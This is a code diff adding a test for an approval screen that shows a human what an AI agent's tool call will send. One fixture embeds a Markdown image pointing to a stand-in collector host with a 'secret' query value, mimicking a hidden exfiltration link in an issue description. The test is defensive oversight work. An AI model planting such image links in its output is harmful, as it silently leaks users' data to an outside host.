@@ -111,4 +111,29 @@ describe('approvals', () => {
     await screen.findAllByText('Which region first?');
     expect(screen.queryByRole('button', { name: 'More ways to approve' })).toBeNull();
   });
+
+  it('shows what Approve lets through, whole: long text, structures, and the addresses in it', async () => {
+    const description = `${'A long description of the change. '.repeat(8)}![status](https://collector.example/?d=secret)`;
+    const tracker = call('tc3', 'tracker__create_issue', {
+      title: 'Ship it',
+      description,
+      labels: ['urgent', 'agent'],
+    });
+    const { calls, user } = renderApprovals([tracker]);
+    const request = within(await screen.findByRole('article', { name: 'Request' }));
+    const sends = within(request.getByLabelText('What it sends'));
+    expect(sends.getByText('tracker__create_issue')).toBeTruthy();
+    // Nothing left out for being long or not a word.
+    expect(sends.getByText(description)).toBeTruthy();
+    expect(sends.getByText(/"urgent",\s*"agent"/)).toBeTruthy();
+    // The picture Markdown would draw as nothing is an address, listed.
+    expect(
+      within(request.getByRole('list', { name: 'Addresses in it' })).getByText(
+        'https://collector.example/?d=secret',
+      ),
+    ).toBeTruthy();
+    // No key approves.
+    await user.keyboard('a');
+    expect(calls.some((one) => one.route.endsWith('/approve'))).toBe(false);
+  });
 });
